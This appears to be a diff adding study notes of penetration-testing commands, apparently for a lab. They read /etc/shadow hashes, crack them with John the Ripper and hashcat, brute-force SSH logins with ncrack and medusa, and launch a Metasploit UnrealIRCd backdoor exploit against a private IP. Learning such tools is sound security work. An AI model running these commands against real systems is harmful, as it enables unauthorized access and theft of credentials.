+useradd -m ron
+useradd -m ben
+passwd chris
+passwd ben
+passwd ron
+
+cat /etc/shadow | egrep "chris|ron|ben" > hashes
+cat hashes
+john hashes
+john -show hashes
+
+tail.john/john.log
+locate wordlist
+john --wordlist mylist hashes_to_crack
+hashcat --force -m 0 -a 0 -o cracked_passwords my_hashes
+ncrack -p 22 --user chris -P my_list 172.18.104.166
+medusa -u chris -P my_list -h 172.18.104.166 -M ssh
+cewl -d 2 -m 5 -w words.txt https://theartofhacking.org
+
+
+# --- Metasploit --- #
+sudo service postgresql start
+msfdb init 
+laters msfdb start, msfdb status, msfdb stop etc...
+search privlege
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOST 10.1.1.14
+exploit
+
